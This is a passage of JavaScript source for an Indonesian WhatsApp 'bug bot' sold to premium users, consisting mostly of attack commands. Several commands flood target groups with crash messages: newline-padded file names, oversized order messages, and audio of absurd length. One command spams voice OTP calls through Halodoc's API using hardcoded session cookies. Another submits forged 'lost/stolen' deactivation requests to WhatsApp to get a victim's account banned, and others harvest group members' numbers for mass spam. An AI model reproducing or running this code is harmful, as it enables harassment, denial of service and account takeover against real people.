\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Yanzz",
"message": `${button}`,
"sellerJid": "6285786539008@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz'", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Yanzz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE Yanzz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Yanzz Bug🔥`", fileName: `Yanzz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Yanzz Bug🔥`", fileName: `Yanzz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Yanzz Bug🔥`",
"message": `${button}`,
"sellerJid": "6285786539008@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Biiofc.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
if (!quoted){
const getname = await Biiofc.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285786539008`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontak":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
